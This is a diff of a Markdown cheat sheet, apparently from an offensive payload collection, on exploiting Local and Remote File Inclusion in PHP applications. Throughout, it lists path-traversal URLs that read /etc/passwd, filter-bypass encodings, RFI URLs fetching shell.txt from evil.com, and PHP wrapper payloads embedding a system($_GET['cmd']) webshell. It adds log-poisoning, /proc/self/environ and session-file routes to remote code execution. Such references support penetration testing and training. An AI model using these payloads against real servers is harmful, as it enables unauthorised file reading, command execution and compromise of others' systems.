@@ -1,6 +1,23 @@
 # Local/Remote File Inclusion
 The File Inclusion vulnerability allows an attacker to include a file, usually exploiting a "dynamic file inclusion" mechanisms implemented in the target application.
 
+## Summary
+* [Basic LFI](#basic-lfi)
+* [Basic RFI](#basic-rfi)
+* [LFI / RFI using wrappers](#lfi--rfi-using-wrappers)
+  * [Wrapper php://filter]()
+  * [Wrapper zip://]()
+  * [Wrapper data://]()
+  * [Wrapper expect://]()
+  * [Wrapper input://]()
+* [LFI to RCE via /proc/*/fd](#lfi-to-rce-via-procfd)
+* [LFI to RCE via /proc/self/environ](#lfi-to-rce-via-procselfenviron)
+* [LFI to RCE via upload](#lfi-to-rce-via-upload)
+* [LFI to RCE via phpinfo()](#lfi-to-rce-via-phpinfo)
+* [LFI to RCE via controlled log file](#lfi-to-rce-via-controlled-log-file)
+* [LFI to RCE via PHP sessions](#lfi-to-rce-via-php-sessions)
+
+
 Interesting files to check out :
 ```
 /etc/issue
@@ -20,6 +37,9 @@ Interesting files to check out :
 /proc/net/route
 /proc/net/tcp
 /proc/net/udp
+```
+The following log files are controllable and can be included with an evil payload to achieve a command execution
+```
 /var/log/apache/access.log
 /var/log/apache/error.log
 /var/log/httpd/error_log
@@ -30,47 +50,68 @@ Interesting files to check out :
 /var/log/mail
 ```
 
+
 ## Basic LFI
 ```
 http://example.com/index.php?page=../../../etc/passwd
+```
 
 Null byte
+```
 http://example.com/index.php?page=../../../etc/passwd%00
+```
 
 Double encoding
+```
 http://example.com/index.php?page=%252e%252e%252fetc%252fpasswd
 http://example.com/index.php?page=%252e%252e%252fetc%252fpasswd%00
+```
 
 Path truncation
+```
 http://example.com/index.php?page=../../../../../../../../../etc/passwd..\.\.\.\.\.\.\.\.\.\.\[ADD MORE]\.\.
 http://example.com/index.php?page=../../../../[…]../../../../../etc/passwd
+```
 
-Filter bypass
+Filter bypass tricks
+```
 http://example.com/index.php?page=....//....//etc/passwd
 http://example.com/index.php?page=..///////..////..//////etc/passwd
+http://example.com/index.php?page=/%5C../%5C../%5C../%5C../%5C../%5C../%5C../%5C../%5C../%5C../%5C../etc/passwd
 ```
 
-## Basic RFI (null byte, double encoding and other tricks)
+## Basic RFI
 ```
 http://example.com/index.php?page=http://evil.com/shell.txt
+```
+
+Null byte
+```
 http://example.com/index.php?page=http://evil.com/shell.txt%00
+```
+
+Double encoding
+```
 http://example.com/index.php?page=http:%252f%252fevil.com%252fshell.txt
 ```
 
-## LFI / RFI Wrappers
+## LFI / RFI using wrappers
 
-LFI Wrapper rot13 and base64 - php://filter case insensitive
+### Wrapper php://filter
+The part "php://filter" is case insensitive
 ```
 http://example.com/index.php?page=php://filter/read=string.rot13/resource=index.php
 http://example.com/index.php?page=php://filter/convert.base64-encode/resource=index.php
 http://example.com/index.php?page=pHp://FilTer/convert.base64-encode/resource=index.php
+```
 
-can be chained with a compression wrapper
+can be chained with a compression wrapper for large files.
+```
 http://example.com/index.php?page=php://filter/zlib.deflate/convert.base64-encode/resource=/etc/passwd
 ```
 
 
-LFI Wrapper ZIP
+### Wrapper zip://
 ```python
 echo "<pre><?php system($_GET['cmd']); ?></pre>" > payload.php;  
 zip payload.zip payload.php;   
@@ -81,50 +122,55 @@ http://example.com/index.php?page=zip://shell.jpg%23payload.php
 ```
 
 
-RFI Wrapper DATA with "<?php system($_GET['cmd']);echo 'Shell done !'; ?>" payload
+### Wrapper data://
 ```
 http://example.net/?page=data://text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUWydjbWQnXSk7ZWNobyAnU2hlbGwgZG9uZSAhJzsgPz4=
+NOTE: the payload is "<?php system($_GET['cmd']);echo 'Shell done !'; ?>"
 ```
+Fun fact: you can trigger an XSS and bypass the Chrome Auditor with : `http://example.com/index.php?page=data:application/x-httpd-php;base64,PHN2ZyBvbmxvYWQ9YWxlcnQoMSk+`
 
-RFI Wrapper EXPECT
+
+### Wrapper expect://
 ```
 http://example.com/index.php?page=php:expect://id
 http://example.com/index.php?page=php:expect://ls
 ```
 
-Bonus XSS    
-XSS via RFI/LFI with "<svg onload=alert(1)>" payload
-```
-http://example.com/index.php?page=data:application/x-httpd-php;base64,PHN2ZyBvbmxvYWQ9YWxlcnQoMSk+
-```
-
-## LFI to RCE via /proc/*/fd
-1. Upload a lot of shells (for example : 100)
-2. Include http://example.com/index.php?page=/proc/$PID/fd/$FD
-with $PID = PID of the process (can be bruteforced) and $FD the filedescriptor (can be bruteforced too)
-/proc/self/environ can also be used
-
-
-## LFI to RCE via Upload
-```
-http://example.com/index.php?page=path/to/uploaded/file.png
-```
-You can injected the <?php system($_GET['c']); ?> into the metadata
-
-## LFI to RCE via Phpinfo()
-https://www.insomniasec.com/downloads/publications/LFI%20With%20PHPInfo%20Assistance.pdf
-Use the script phpInfoLFI.py (also available at https://www.insomniasec.com/downloads/publications/phpinfolfi.py)
-
-
-## LFI to RCE via input:// stream
+### Wrapper input://
 Specify your payload in the POST parameters
 ```
 http://example.com/index.php?page=php://input
 POST DATA: <? system('id'); ?>
 ```
 
+## LFI to RCE via /proc/*/fd
+1. Upload a lot of shells (for example : 100)
+2. Include http://example.com/index.php?page=/proc/$PID/fd/$FD
+with $PID = PID of the process (can be bruteforced) and $FD the filedescriptor (can be bruteforced too)
+
+## LFI to RCE via /proc/self/environ
+Like a log file, send the payload in the User-Agent, it will be reflected inside the /proc/self/environ file
+```
+GET vulnerable.php?filename=../../../proc/self/environ HTTP/1.1
+User-Agent: <?=phpinfo(); ?>
+```
+
+
+
+## LFI to RCE via upload
+If you can upload a file, just inject the shell payload in it (e.g : "<?php system($_GET['c']); ?>" ).
+```
+http://example.com/index.php?page=path/to/uploaded/file.png
+```
+In order to keep the file readable it is best to inject into the metadata for the pictures/doc/pdf
+
+## LFI to RCE via phpinfo()
+https://www.insomniasec.com/downloads/publications/LFI%20With%20PHPInfo%20Assistance.pdf
+Use the script phpInfoLFI.py (also available at https://www.insomniasec.com/downloads/publications/phpinfolfi.py)
+
+
 ## LFI to RCE via controlled log file
-Just append your PHP code into the log file and include it.
+Just append your PHP code into the log file by doing a request to the service (Apache, SSH..) and include the log file.
 ```
 http://example.com/index.php?page=/var/log/apache/access.log
 http://example.com/index.php?page=/var/log/apache/error.log
@@ -136,7 +182,7 @@ http://example.com/index.php?page=/usr/local/apache/log/error_log
 http://example.com/index.php?page=/usr/local/apache2/log/error_log
 ```
 
-## LFI to RCE via PHP Sessions
+## LFI to RCE via PHP sessions
 Check if the website use PHP Session (PHPSESSID)
 ```
 Set-Cookie: PHPSESSID=i56kgbsq9rm8ndg3qbarhsbm27; path=/
@@ -157,25 +203,6 @@ login=1&user=admin&pass=password&lang=/../../../../../../../../../var/lib/php5/s
 ```
 
 
-## Checklist - Common ways of upgrading from LFI to RCE
-```
-Using file upload forms/functions
-Using the PHP wrapper expect://command
-Using the PHP wrapper php://file
-Using the PHP wrapper php://filter
-Using PHP input:// stream
-Using data://text/plain;base64,command
-Using /proc/self/environ
-Using /proc/self/fd
-Using PHP Session
-Using log files with controllable input like:
-  /var/log/apache/access.log
-  /var/log/apache/error.log
-  /var/log/vsftpd.log
-  /var/log/sshd.log
-  /var/log/mail
-```
-
 ## Thanks to
 * [OWASP LFI](https://www.owasp.org/index.php/Testing_for_Local_File_Inclusion)
 * [HighOn.coffee LFI Cheat](https://highon.coffee/blog/lfi-cheat-sheet/)
@@ -183,3 +210,4 @@ Using log files with controllable input like:
 * [Is PHP vulnerable and under what conditions?](http://0x191unauthorized.blogspot.fr/2015/04/is-php-vulnerable-and-under-what.html)
 * [Upgrade from LFI to RCE via PHP Sessions](https://www.rcesecurity.com/2017/08/from-lfi-to-rce-via-php-sessions/)
 * [Local file inclusion tricks](http://devels-playground.blogspot.fr/2007/08/local-file-inclusion-tricks.html)
+* [CVV #1: Local File Inclusion - SI9INT](https://medium.com/bugbountywriteup/cvv-1-local-file-inclusion-ebc48e0e479a)
